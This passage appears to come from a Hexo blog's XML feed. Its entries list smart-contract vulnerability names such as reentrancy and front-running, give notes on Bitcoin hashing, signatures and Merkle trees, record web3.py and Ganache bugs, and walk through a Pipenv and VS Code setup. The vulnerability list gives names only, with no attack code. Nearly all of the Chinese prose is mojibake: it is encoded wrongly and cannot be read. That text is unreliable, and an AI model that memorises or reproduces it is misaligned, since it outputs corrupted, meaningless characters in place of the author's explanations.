Underflow</li><li>Divide before multiply</li></ul><h4 id="äº¤æ˜“å—ä¾èµ–æ€§">(äº¤æ˜“/å—)ä¾èµ–æ€§</h4><p>Front-Running / Race Condition / time-of-check vs time-of-use(TOCTOU)</p><ul><li>Displacement attack</li><li>Insertion / Transaction Order Dependence (TOD)ï¼ˆæ’é˜Ÿæ”»å‡»ï¼‰/Unpredictable state</li><li>Suppression(Block Stuffing attacks) / Transaction Congestion Attackï¼ˆæ–°å‹æ”»å‡»ï¼‰<ul><li>Block Order Dependence</li></ul></li></ul><h4 id="å‡½æ•°è°ƒç”¨">å‡½æ•°è°ƒç”¨</h4><ul><li>Reentrancy (é‡å…¥è°ƒç”¨)<ul><li>Reentrancy on a Single Function</li><li>Cross-function Reentrancy</li></ul></li><li>Exception disorder/Mishandled Exceptions<ul><li>Unchecked external call</li><li>Unchecked Return Values For Low Level Calls / Invoke Low Level/<code>call(), delegatecall(), callcode(), call.value(), send(), transfer() Ecrecoverï¼ŒEcrecover</code></li></ul></li><li>Call to the unknown</li><li>no fallback (å›è°ƒå‡½æ•°)</li></ul><h4 id="æƒé™æ§åˆ¶">æƒé™æ§åˆ¶</h4><ul><li>TX Origin Authentication/Origin vulnerabilities</li><li>Function Default Visibility</li><li>State Variable Default Visibility/Implicit visibilitylevel(ä¸æ˜ç¡®æŒ‡å®šå¯è§æ€§ï¼‰</li><li>Uninitialized Storage Pointer</li><li>Write to Arbitrary Storage Location</li></ul><h4 id="ä¸šåŠ¡é€»è¾‘">ä¸šåŠ¡é€»è¾‘</h4><ul><li>Lack of Proper Signature Verification</li><li>Requirement Violation</li><li>Incorrect Inheritance Order</li><li>Denial Of Service/Dos DoS With Block Gas Limit/ Out-of-GasVulnerability DoS with Failed Call / DoS by external contract / DoS with(Unexpected) revert / DoS by external function call in require</li><li>Block Members Manipulation<ul><li>Timestamp Dependence / Time Manipulation</li><li>Hash Collisions With Multiple Variable Length Arguments</li></ul></li><li>Unexpected Ether balance / Balance equality / Forcibly Sending Etherto a Contract</li><li>Random Number Attack(éšæœºæ•°æ”»å‡») / Generating randomness</li><li>Roll Back Attack(äº¤æ˜“å›æ»šæ”»å‡»)</li></ul><h4 id="å¼‚å¸¸çŠ¶æ€æ£€æµ‹">å¼‚å¸¸çŠ¶æ€æ£€æµ‹</h4><ul><li>Assert Violation</li><li>Insufficient Gas Griefing</li></ul><h2 id="ç»¼åˆ">ç»¼åˆ</h2><p>åŒ…æ‹¬ EVMã€solidity ç­‰è®¾è®¡é—®é¢˜ä¸æ ¡éªŒé—®é¢˜ç­‰</p><ul><li>Short Address Attack (çŸ­åœ°å€æ”»å‡»)</li><li>Local/State variable shadowing(å˜é‡è¦†ç›–/å˜é‡é®è”½)</li><li>Builtin Symbol Shadowing</li><li>hash ç¢°æ’</li><li>Right-To-Left-Override control character(SWC-130)</li></ul>]]></content>
      
      
      <categories>
          
          <category> blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BTC-å¯†ç å­¦åŸç†åŠå…¶æ•°æ®ç»“æ„</title>
      <link href="/blog/2021/03/13/blockchain/1.btc_crypto_principle/"/>
      <url>/blog/2021/03/13/blockchain/1.btc_crypto_principle/</url>
      
        <content type="html"><![CDATA[<h2 id="btc-å¯†ç å­¦åŸç†">BTC-å¯†ç å­¦åŸç†</h2><p>æ¯”ç‰¹å¸è¢«ç§°ä¸ºåŠ å¯†è´§å¸ï¼Œä½†å…¶å®åŠ å¯†è´§å¸éƒ½æ˜¯ä¸åŠ å¯†çš„ï¼Œæ‰€æœ‰çš„æ•°æ®éƒ½æ˜¯å…¬å¼€çš„ï¼Œåªæ˜¯å®ƒé€šè¿‡å”¯ä¸€çš„äºŒè¿›åˆ¶å­ä¸²åœ°å€å°†ç°å®ç”Ÿæ´»ä¸­äººçš„èº«ä»½ä¿¡æ¯ç»™éšè—äº†ã€‚</p><p>åŒºå—é“¾ä¸­ä¸»è¦ä½¿ç”¨äº†ä¸¤ç§å¯†ç å­¦åŸç†ï¼šå“ˆå¸Œå‡½æ•°ï¼ˆcryptographic hashfunctionï¼‰å’Œç­¾å</p><h2 id="å“ˆå¸Œå‡½æ•°">å“ˆå¸Œå‡½æ•°</h2><p>ä¸¤ç§æ€§è´¨ï¼š</p><ol type="1"><li><p>collision resistance ç”¨å¤„ï¼šå¯¹ä¸€ä¸ª message æ±‚ digestï¼Œç”¨æ¥æ£€æµ‹å¯¹message çš„ç¯¡æ”¹</p></li><li><p>hiding æ„æ€æ˜¯å“ˆå¸Œå‡½æ•°çš„è®¡ç®—è¿‡ç¨‹æ˜¯å•å‘ã€ä¸å¯é€†çš„ hidingçš„å‰ææ˜¯è¾“å…¥ç©ºé—´è¶³å¤Ÿå¤§ã€è¾“å…¥åˆ†å¸ƒå‡åŒ€ï¼Œä½¿å¾— brute-force ä¸å¯è¡Œ</p><p>å¦‚æœè¾“å…¥ç©ºé—´ä¸å¤Ÿå¤§ï¼Œå¸¸ç”¨çš„æ–¹æ³•æ˜¯è¾“å…¥æ‹¼æ¥ä¸€ä¸ªéšæœºæ•°ï¼Œç„¶åæ•´ä½“å–å“ˆå¸ŒHï¼ˆx||nouceï¼‰</p><p>ç”¨å¤„æ˜¯ï¼šå’Œ collision resistance ç»“åˆï¼Œå®ç° digital commitmentï¼Œä¹Ÿç§°digital equivalent of a sealed envelope</p></li><li><p>puzzle friendly</p><p>å“ˆå¸Œå€¼çš„è®¡ç®—äº‹å…ˆæ˜¯ä¸å¯é¢„æµ‹çš„, æ¯”å¦‚ï¼šæƒ³å¾—åˆ°å‰ k ä½ä¸º 0çš„å“ˆå¸Œå€¼åˆ™åªèƒ½ä¸€ä¸ªä¸ªå»è¯•ï¼Œè€Œæ²¡æœ‰æ·å¾„ï¼Œæ‰€ä»¥æ‰å¯ä»¥ PoW</p><p>æŒ–çŸ¿ï¼šæ‰¾ä¸€ä¸ª nouceï¼Œnouce å’Œå…¶ä»–åŒºå—ä¿¡æ¯ä½œä¸ºä¸€ä¸ªè¾“å…¥ï¼Œè®¡ç®—å“ˆå¸Œå¾—åˆ°H(block header)ï¼ŒH(block header) &lt;= target space</p><p>æŒ–çŸ¿å¾ˆéš¾ï¼ŒéªŒè¯å¾ˆå®¹æ˜“ï¼Œè¿™ä¸ªæ€§è´¨å«åšï¼šdifficult to solveï¼Œbut easy toverify</p><p>å½“æˆ‘ä»¬è®¾è®¡ mining puzzle çš„æ—¶å€™éœ€è¦æ³¨æ„è¿™ç§æ€§è´¨ã€‚</p><p>æ¯”ç‰¹å¸ä¸­ä½¿ç”¨çš„å“ˆå¸Œå‡½æ•°ï¼šSHA256ï¼ˆSecure Hash Algorithmï¼‰</p></li></ol><h2 id="ç­¾å">ç­¾å</h2><h3 id="æ¯”ç‰¹å¸çš„è´¦æˆ·ç®¡ç†">æ¯”ç‰¹å¸çš„è´¦æˆ·ç®¡ç†</h3><p>å¼€æˆ·çš„è¿‡ç¨‹ï¼šåˆ›å»ºä¸€ä¸ªå…¬ç§é’¥å¯¹(public keyï¼Œ privatekey)ï¼Œå…¬é’¥ç›¸å½“äºé“¶è¡Œè´¦å·ï¼Œç§é’¥ç›¸å½“äºè´¦æˆ·å¯†ç ã€‚</p><p>ä¸¤ä¸ªäººå…¬ç§é’¥ç›¸åŒçš„æ¦‚ç‡å¾®ä¹å…¶å¾®ï¼Œè¿™é‡Œæœ‰ä¸ªå‰æ/å‡è®¾ï¼šäº§ç”Ÿå…¬ç§é’¥çš„æ—¶å€™æœ‰ä¸€ä¸ªå¥½çš„éšæœºæºa good source of randomness.</p><p>æ¯”ç‰¹å¸ä½¿ç”¨çš„ç­¾åç®—æ³•ä¸åªæ˜¯ç”Ÿæˆå…¬ç§é’¥çš„æ—¶å€™æœ‰ä¸€ä¸ªå¥½çš„éšæœºæºï¼Œä¹‹åç­¾åçš„æ—¶å€™ä¹Ÿè¦æœ‰å¥½çš„éšæœºæºï¼Œåªè¦æœ‰ä¸€æ¬¡ç­¾åæ—¶ç”¨çš„éšæœºæºä¸å¥½ï¼Œé‚£å°±æœ‰å¯èƒ½æ³„éœ²ç§é’¥ã€‚</p><h2 id="æ•°æ®ç»“æ„">æ•°æ®ç»“æ„</h2><p>æ¯”ç‰¹å¸ä¸­æœ€åŸºæœ¬çš„ç»“æ„å°±æ˜¯åŒºå—é“¾ï¼ŒåŒºå—é“¾å°±æ˜¯ä¸€ä¸ªä¸€ä¸ªåŒºå—ç»„æˆçš„é“¾è¡¨ã€‚åŒºå—é“¾å’Œæ™®é€šçš„é“¾è¡¨ç›¸æ¯”æœ‰ä»€ä¹ˆåŒºåˆ«:</p><p>æ¯ä¸ªåŒºå—ä¸­å­˜å‚¨ç€å‰ä¸€ä¸ªåŒºå—çš„å“ˆå¸Œå€¼ï¼Œå½¢æˆåŒºå—é“¾ã€‚åˆå§‹ä¸ºåˆ›ä¸–åŒºå—genesis blockï¼Œ æœ€æ–°çš„ä¸º most recent blockã€‚é€šè¿‡è¿™æ ·çš„æ•°æ®ç»“æ„å¯ä»¥å®ç°tamper-evident log</p><p>åªè¦ä¿å­˜æœ€åä¸€ä¸ªå“ˆå¸Œå€¼ï¼Œå°±å¯ä»¥çŸ¥é“æ˜¯å¦ä¿®æ”¹åŒºå—é“¾ä»»ä½•ä¸€ä¸ªéƒ¨ä½çš„åŒºå—ã€‚</p><p>å€ŸåŠ©æ­¤æ€§è´¨ï¼Œæ¯”ç‰¹å¸ä¸­æœ‰äº›èŠ‚ç‚¹å°±ä¸ä¸€å®šéœ€è¦ä¿å­˜æ•´æ¡åŒºå—é“¾çš„å†…å®¹ï¼Œåªéœ€è¦ä¿å­˜æœ€è¿‘çš„å‡ ä¸ªå°±è¡Œï¼Œéœ€è¦ä¹‹å‰çš„å‘å…¶ä»–èŠ‚ç‚¹ç´¢å–ï¼Œå¹¶è®¡ç®—å“ˆå¸Œå€¼ä¸è‡ªå·±ä¿å­˜çš„åŒºå—ä¸­ä¸Šä¸€ä¸ªåŒºå—çš„å“ˆå¸Œå€¼éªŒè¯å°±å¥½äº†ã€‚</p><h1 id="double-spending-attack">double spending attack</h1><p>åŒºå—é“¾ä¸­æœ‰ä¸¤ç§ hashæŒ‡é’ˆï¼šä¸€ç§é“¾æ¥å„ä¸ªåŒºå—ä¹‹é—´çš„ï¼ŒæŒ‡å‘å‰ä¸€ä¸ªåŒºå—ï¼Œå°†å®ƒä»¬æ„æˆå„ä¸ªé“¾è¡¨</p><p>å¦ä¸€ç§æŒ‡å‘å‰é¢æŸä¸ªäº¤æ˜“çš„ï¼Œè¯´æ˜é’±æ˜¯ä»å“ªé‡Œæ¥çš„ï¼Œä¸€æ–¹é¢è¯´æ˜é’±æ˜¯ä»å“ªé‡Œæ¥çš„ï¼Œä¸æ˜¯æé€ çš„ï¼Œå¦ä¸€æ–¹é¢é˜²æ­¢åŒèŠ±é—®é¢˜ã€‚</p><p>åˆ«çš„èŠ‚ç‚¹æ”¶åˆ°è½¬è´¦çš„æ—¶å€™ï¼Œä»å…¶è‡ªèº«é€ä¸ªå‘å‰å›æº¯è‡³æŒ‡å‘çš„äº¤æ˜“å“ˆå¸Œï¼Œçœ‹è½¬ç»™è‡ªå·±çš„é’±æ˜¯å¦å·²ç»è¢«èŠ±å‡ºå»äº†ã€‚</p><p>æ¯”ç‰¹å¸ä¸­çš„å¦å¤–ä¸€ä¸ªç»“æ„æ˜¯: Merkle tree</p><h2 id="merkle-tree">merkle tree</h2><p>å’Œ binary tree çš„åŒºåˆ«æ˜¯ï¼šç”¨å“ˆå¸ŒæŒ‡é’ˆä»£æ›¿äº†æ™®é€šæŒ‡é’ˆ</p><p>Merkle Treeï¼Œé€šå¸¸ä¹Ÿè¢«ç§°ä½œ Hash Treeï¼Œé¡¾åæ€ä¹‰ï¼Œå°±æ˜¯å­˜å‚¨ hashå€¼çš„ä¸€æ£µæ ‘ã€‚Merkle æ ‘çš„å¶å­æ˜¯æ•°æ®å—(ä¾‹å¦‚ï¼Œæ–‡ä»¶æˆ–è€…æ–‡ä»¶çš„é›†åˆ)çš„ hashå€¼ã€‚éå¶èŠ‚ç‚¹æ˜¯å…¶å¯¹åº”å­èŠ‚ç‚¹ä¸²è”å­—ç¬¦ä¸²çš„ hashã€‚</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/merkle_tree.jpg"alt="merkle_tree" /><figcaption aria-hidden="true">merkle_tree</figcaption></figure><p>åªè¦è®°ä½äº† root hashï¼Œå°±å¯ä»¥æ£€æµ‹å¯¹æ•´ä¸ªæ ‘çš„ä¿®æ”¹ã€‚</p><p>æ¯ä¸ªåŒºå—åŒ…å« block header å’Œ block bodyã€‚ block headeré‡Œé¢åŒ…å«å“ˆå¸Œå€¼ï¼Œblock body é‡Œé¢å­˜å‚¨äº¤æ˜“ä¿¡æ¯</p><p>merkle çš„ç”¨é€”ï¼š</p><ol type="1"><li>æä¾› merkle proof æ¯”ç‰¹å¸ä¸­çš„èŠ‚ç‚¹åˆ†ä¸ºä¸¤ç±»ï¼šå…¨èŠ‚ç‚¹å’Œè½»èŠ‚ç‚¹ã€‚</li></ol>]]></content>
      
      
      <categories>
          
          <category> blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ä½¿ç”¨ python ç»“åˆåŒºå—é“¾å¼€å‘æ—¶é‡åˆ°çš„é—®é¢˜æ±‡æ€»</title>
      <link href="/blog/2021/03/02/blockchain/ethereum/solidity_web3_issues/"/>
      <url>/blog/2021/03/02/blockchain/ethereum/solidity_web3_issues/</url>
      
        <content type="html"><![CDATA[<h2 id="varibles">Varibles</h2><p><ahref="https://medium.com/coinmonks/solidity-tutorial-all-about-mappings-29a12269ee14">mapping</a></p><h2 id="web3.py-ç¼ºé™·">Web3.py ç¼ºé™·</h2><ol type="1"><li><p><a href="https://github.com/ethereum/web3.py/issues/1629">web3.pyåœ¨ç»“æ„ä½“ä½œä¸º event å‚æ•°æ—¶ï¼Œå­˜åœ¨ bug,ä¸å¯ç”¨</a></p></li><li><p><ahref="https://ethereum.stackexchange.com/a/36070/71394">web3.py filterçš„ get_new_entry åœ¨ filter çš„ fromblock ä¸º 0 æ—¶ï¼Œéœ€è¦å…ˆget_all_entry</a></p></li><li><p>æ—¥å¿—è¿‡æ»¤æ—¶é—´é—´éš”ï¼š ganacheç­‰æœ¬åœ°èŠ‚ç‚¹å‘èµ·äº¤æ˜“åï¼Œå›æ˜¾åŒºå—å½¢æˆï¼Œä½†éœ€è¦ç¨ç­‰ 1så·¦å³ï¼ˆtime.sleep(1)ï¼‰ï¼Œç­‰å¾…æ—¥å¿—å†™å…¥ï¼Œç„¶åè¿‡æ»¤æ—¥å¿—æ‰èƒ½å¾—åˆ°ã€‚ç›´æ¥å‘èµ·äº¤æ˜“ï¼Œè¿‡æ»¤æ—¥å¿—ç”±äºæ—¥å¿—æ²¡æœ‰å†™ä¸Šï¼Œä¼šå¯¼è‡´è¿‡æ»¤ä¸åˆ°ã€‚</p></li></ol><h2 id="ganache-bug">ganache bug</h2><ol type="1"><li><a href="https://github.com/ethereum/web3.py/issues/674">Eventsfiltering not working with EIP checksum addresses (Ganache-CLI) Â· Issue#674 Â· ethereum/web3.py</a></li></ol><p>checksum åœ°å€è¿‡æ»¤ï¼Œè¿”å›ç©ºï¼Œéœ€è¦ä½¿ç”¨.lower()å‡½æ•°å°†åœ°å€è½¬æ¢ä¸ºå°å†™çš„ã€‚Apr 27, 2021</p><ol type="1"><li>edge.py æ—¥å¿—è¿‡æ»¤é‚£éƒ¨åˆ†å†™çš„ä¸å¥½ï¼Œå¯¼è‡´è¿è¡Œå‡ºé”™ï¼Œå¯¼è‡´ ganacheå‡ºç°é—®é¢˜ï¼Œä½¿å¾— client.py æ­£å¸¸çš„è¿‡æ»¤åŠŸèƒ½ä¹Ÿæ— æ³•å®ç°ï¼Œåªèƒ½é‡å¯ ganache</li></ol><h2 id="ç­¾å">ç­¾å</h2><p>åœ¨ä»¥å¤ªåŠä¸­ï¼Œå¸¸è§çš„åŒºå—å“ˆå¸Œã€äº¤æ˜“å“ˆå¸Œã€çŠ¶æ€å“ˆå¸Œç­‰ç­‰éƒ½ä½¿ç”¨çš„ Keccak256å“ˆå¸Œç®—æ³•, æ˜¯æŠ—ç¢°æ’çš„</p><h3 id="abi.encode-å’Œ-abi.encodepacked">abi.encode() å’Œabi.encodePacked()</h3><p>å…³äº abi.encode() å’Œ abi.encodPacked()ï¼Œstackexchangeä¸Šçš„è¿™ä¸ªå›ç­”æ¯”è¾ƒå¥½ï¼š<ahref="https://ethereum.stackexchange.com/questions/119583/when-to-use-abi-encode-abi-encodepacked-or-abi-encodewithsignature-in-solidity">Whento use abi.encode, abi.encodePacked or abi.encodeWithSignature insolidity - Ethereum Stack Exchange</a>ã€‚ç»“è®ºå°±æ˜¯ï¼šä¸ºèŠ‚çœå†…å­˜å’ŒGasï¼Œä¸€èˆ¬ä½¿ç”¨abi.encodePacked()ï¼Œä½†æ˜¯å½“è¾“å…¥å­˜åœ¨ä¸¤ä¸ªåŠä»¥ä¸Šçš„åŠ¨æ€ç±»å‹ï¼ˆstringï¼ŒåŠ¨æ€æ•°ç»„ç­‰ï¼‰æ—¶ï¼Œä½¿ç”¨å®ƒææ˜“äº§ç”Ÿç¢°æ’é£é™©ï¼Œå› æ­¤è¯¥æƒ…å†µä¸‹æ”¹ç”¨abi.encode().</p><h3 id="mload-assembly-function">mload assembly function</h3><p>Solidity æ”¯æŒ Inline Assemblyï¼Œå…¶ä½¿ç”¨çš„å†…è”æ±‡ç¼–è¯­è¨€å«ï¼šYul.Assemblyå¯ä»¥ç›´æ¥ä½¿ç”¨ opcodes ç›´æ¥ä¸ EVM äº¤äº’ã€‚</p><p>mload(0xAB) Loads the word (32byte) located at the memory address0xAB.</p><p>mload and mstore are defined in details in the yellow paper :</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16451713233749.jpg"alt="16451713233749" /><figcaption aria-hidden="true">16451713233749</figcaption></figure><h3 id="çº¿ä¸ŠéªŒè¯å·¥å…·">çº¿ä¸ŠéªŒè¯å·¥å…·</h3><p><a href="https://app.mycrypto.com/sign-message">MyCrypto - SignMessage</a></p><h2 id="å‚è€ƒæ–‡çŒ®">å‚è€ƒæ–‡çŒ®</h2><p><ahref="https://ethereum.stackexchange.com/questions/119583/when-to-use-abi-encode-abi-encodepacked-or-abi-encodewithsignature-in-solidity">Whento use abi.encode, abi.encodePacked or abi.encodeWithSignature insolidity - Ethereum Stack Exchange</a> <ahref="https://ethereum.stackexchange.com/questions/9603/understanding-mload-assembly-function/9610">solidity- understanding mload assembly function - Ethereum StackExchange</a></p><h2 id="æ³¨æ„ä¸æ€è€ƒ">æ³¨æ„ä¸æ€è€ƒ</h2><ol type="1"><li>å‡½æ•°ä»¥åŠå…¶å‚æ•°çš„å‘½åè¦å°½é‡é€šç”¨</li><li>å¯ä»¥é€šè¿‡è®¾ç½®ä¸€ä¸ªå‚æ•°å¯é€‰æˆ–è€…å¤šè®¾ç½®ä¸€ä¸ªå‚æ•°ï¼Œæ¥ä½¿å¾—è¯¥å‡½æ•°å¤ç”¨æ€§å¢å¼ºã€‚</li><li>tcp æ•°æ®æµæœåŠ¡ç«¯å¹¶èƒ½ç¡®å®šä¸€æ¡æ¶ˆæ¯çš„å¼€å¤´å’Œç»“å°¾ è§£å†³ï¼š1. å›ºå®šé•¿åº¦åˆ†å‰²2. æ¶ˆæ¯ä¸­å¢åŠ åˆ†éš”ç¬¦ 3. æ¶ˆæ¯å¼€å¤´å¢åŠ æ¶ˆæ¯é•¿åº¦å­—æ®µæ ‡è¯† <ahref="https://stackoverflow.com/questions/21685473/python-sockets-how-to-only-receive-one-message-at-a-time">Pythonsockets: how to only receive one message at a time - StackOverflow</a></li><li>ä¿®æ”¹åçš„åˆçº¦éœ€è¦é‡æ–°éƒ¨ç½²</li><li>éƒ¨ç½²åˆçº¦æ—¶ï¼Œåˆ«å¿˜äº†é€‰æ‹© web3 provider</li><li>æ—¥å¿—æ˜¯ç›¸å¯¹äºåˆçº¦è€Œè¨€çš„ï¼Œä¿®æ”¹åæ–°éƒ¨ç½²çš„åˆçº¦æ²¡æœ‰æ—¥å¿—ï¼Œéœ€è¦å¤šè¿›è¡Œä¸€äº›äº¤æ˜“ï¼Œç„¶åè¿‡æ»¤æ‰èƒ½æœ‰æ—¥å¿—å¯è¨€ã€‚</li><li>æ£€æŸ¥ç±»å‹è½¬æ¢</li></ol>]]></content>
      
      
      <categories>
          
          <category> blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Pipenv ä¸ vscode é…ç½®ä½¿ç”¨</title>
      <link href="/blog/2021/02/16/programming/python/configurations/pipenv_vscode/"/>
      <url>/blog/2021/02/16/programming/python/configurations/pipenv_vscode/</url>
      
        <content type="html"><![CDATA[<h2 id="pipenv-å®‰è£…">Pipenv å®‰è£…</h2><p>Arch Linux: <code>yay -S python-pipenv</code>å…¶ä»–ç³»ç»Ÿï¼š<code>pip install pipenv</code></p><h2 id="è™šæ‹Ÿç¯å¢ƒè·¯å¾„">è™šæ‹Ÿç¯å¢ƒè·¯å¾„</h2><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œpipenv åœ¨ Linuxä¸‹åˆ›å»ºçš„è™šæ‹Ÿç¯å¢ƒè·¯å¾„å­˜å‚¨åœ¨ï¼š<code>~/.local/share/virtualenvs/</code>ï¼Œå¦‚æœæ‰¾ä¸åˆ°å¯ä»¥é€šè¿‡ä»¥ä¸‹ä¸¤ä¸ªé€‰é¡¹ç¡®å®šè™šæ‹Ÿç¯å¢ƒè·¯å¾„ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--venv                          Output virtualenv information.</span><br><span class="line">--py                            Output Python interpreter information.</span><br></pre></td></tr></table></figure><p>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¹ æƒ¯å°†è™šæ‹Ÿç¯å¢ƒæ”¾åœ¨å¯¹åº”é¡¹ç›®ä¸‹é¢ï¼Œå› æ­¤éœ€è¦åœ¨<code>.bashrc/.zshrc</code>(æˆ–è€…å…¶ä»–ç»ˆç«¯é…ç½®æ–‡ä»¶ä¸­) åŠ å…¥<code>export PIPENV_VENV_IN_PROJECT=1</code>æ¥è®©è™šæ‹Ÿç¯å¢ƒåˆ›å»ºåˆ°ä½ çš„é¡¹ç›®ç›®å½•ä¸­ï¼Œè¿™æ ·å°±é¿å…äº†ä»¥åè·¯å¾„æ›´æ”¹å¸¦æ¥çš„é—®é¢˜ã€‚</p><p>åœ¨ Windows ä¸Šæˆ‘ä»¬å¯ä»¥é‡‡ç”¨æ·»åŠ ç¯å¢ƒå˜é‡çš„æ–¹å¼è¿›è¡Œè®¾ç½®ï¼šæ·»åŠ ç¯å¢ƒå˜é‡<code>PIPENV_VENV_IN_PROJECT</code>ï¼Œè®¾ç½®å…¶å€¼ä¸º <code>true</code> æˆ–è€…<code>1</code>ã€‚</p><h2 id="pipenv-vscode-ä½¿ç”¨">pipenv + vscode ä½¿ç”¨</h2><h3 id="é…ç½®è™šæ‹Ÿ-python-è§£é‡Šå™¨">é…ç½®è™šæ‹Ÿ python è§£é‡Šå™¨</h3><p>æ‰“å¼€é¡¹ç›®æ ¹ç›®å½•ä¸‹çš„ <code>.vscode/settings.json</code>ï¼Œå¦‚æœæ²¡æœ‰ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢å‘½ä»¤åˆ›å»ºï¼š<code>mkdir .vscode &amp;&amp; touch .vscode/settings.json</code>ï¼Œç„¶åå°†ä»¥ä¸‹å†…å®¹å¤åˆ¶è¿›å»ï¼š</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;files.exclude&quot;: &#123;</span><br><span class="line">        &quot;**/.git&quot;: true,</span><br><span class="line">        &quot;**/.svn&quot;: true,</span><br><span class="line">        &quot;**/.hg&quot;: true,</span><br><span class="line">        &quot;**/CVS&quot;: true,</span><br><span class="line">        &quot;**/.DS_Store&quot;: true,</span><br><span class="line">        &quot;**/*.pyc&quot;: true,</span><br><span class="line">        &quot;**/__pycache__&quot;: true</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;python.pythonPath&quot;: &quot;&lt;VIRTUALENV_PYTHON_PATH_HERE&gt;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>file.exclude</code> å—å¯¹é‚£äº›æ²¡æœ‰æ˜¾ç¤ºçš„æ–‡ä»¶,ç”¨ç°å­˜çš„ VSCodeè®¾ç½®ï¼Œç„¶åå°† <code>.pyc</code> å’Œ <code>__pycache__</code>åŠ å…¥åˆ°åˆ—è¡¨ä¸­ã€‚<code>python.pythonPath</code> ç”¨æ¥æŒ‡å®šè¯¥é¡¹ç›®çš„ pythonè·¯å¾„ï¼Œ ä¸€èˆ¬å†™ä¸º<code>.venv/bin/python</code> å³å¯</p><p>ç„¶åä½¿ç”¨ VScode åœ¨è½½å…¥é¡¹ç›®æ—¶ï¼Œåœ¨å·¦ä¸‹è§’ç‚¹å‡» Pythonè§£é‡Šå™¨ï¼Œé€‰æ‹©è™šæ‹Ÿç¯å¢ƒçš„é‚£ä¸ªå³å¯ã€‚</p><p>å…³äº Code-Runner è¿è¡Œä½¿ç”¨çš„è§£é‡Šå™¨ï¼Œä¹Ÿå¯ä»¥åœ¨è¯¥é¡¹ç›®çš„ setting.jsoné‡Œé¢ä¿®æ”¹ï¼Œå®ƒä¼šä¼˜å…ˆä½¿ç”¨æœ¬åœ°çš„è®¾ç½®è¦†ç›–å…¨å±€çš„è®¾ç½®ã€‚</p><p>æˆ‘çš„ä¸€ä¸ªè™šæ‹Ÿç¯å¢ƒçš„ <code>.vscode/settings.json</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;python.pythonPath&quot;: &quot;.venv/bin/python&quot;,</span><br><span class="line">    &quot;code-runner.executorMap&quot;: &#123;</span><br><span class="line">        // code runner é…ç½®è§£é‡Šå™¨</span><br><span class="line">        &quot;python&quot;: &quot;.venv/bin/python&quot;,</span><br><span class="line">        &quot;shell&quot;: &quot;/usr/bin/zsh&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    // coder runner é…ç½®åœ¨ç»ˆç«¯è¿è¡Œ</span><br><span class="line">    &quot;code-runner.runInTerminal&quot;: true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="pipenv-ç®€å•ä½¿ç”¨">pipenv ç®€å•ä½¿ç”¨</h2><ol type="1"><li><p>åœ¨é¡¹ç›®æ ¹ç›®å½•ä¸‹åˆ›å»ºè™šæ‹Ÿç¯å¢ƒæˆ–è€…å®‰è£…åŒ…</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="built_in">cd</span> myproject</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">pipenv install requests</span></span><br></pre></td></tr></table></figure></p></li><li><p>åœ¨è™šæ‹Ÿç¯å¢ƒä¸‹è¿è¡Œè„šæœ¬æ–‡ä»¶</p><ol type="1"><li><p><code>pipenv run</code>è¿è¡Œä¸€æ¬¡<code>pipenv run python main.py</code></p></li><li><p><code>pipenv shell</code> è¿›å…¥è™šæ‹Ÿshellï¼Œç„¶åå°±å¯ä»¥æ„‰å¿«çš„åœ¨é‡Œé¢<code>python main.py</code></p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ pipenv shell</span><br><span class="line">Launching subshell in virtual environment...</span><br><span class="line">. /run/media/realyee/notes/pyworkspace/rl/.venv/bin/activate</span><br><span class="line"></span><br><span class="line"># realyee @ arch in /run/media/realyee/notes/pyworkspace/rl on git:master x [14:28:34]</span><br><span class="line">$  . /run/media/realyee/notes/pyworkspace/rl/.venv/bin/activate</span><br><span class="line">(rl)</span><br></pre></td></tr></table></figure></p></li></ol></li><li><p>é€€å‡ºè™šæ‹Ÿç¯å¢ƒ <code>exit</code></p></li><li><p>å¸è½½æŸä¸ªåŒ…</p><p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pipenv uninstall XXX  # å¸è½½ XXX æ¨¡å—ï¼Œ å¹¶ä»Pipfileä¸­ç§»é™¤</span><br><span class="line">pipenv uninstall --all  # å¸è½½å…¨éƒ¨åŒ…ï¼Œå¹¶ä»Pipfileä¸­ç§»é™¤</span><br><span class="line">pipenv uninstall --all-dev  # å¸è½½å…¨éƒ¨å¼€å‘åŒ…ï¼Œ å¹¶ä»Pipfileä¸­ç§»é™¤</span><br></pre></td></tr></table></figure></p></li><li><p>åˆ 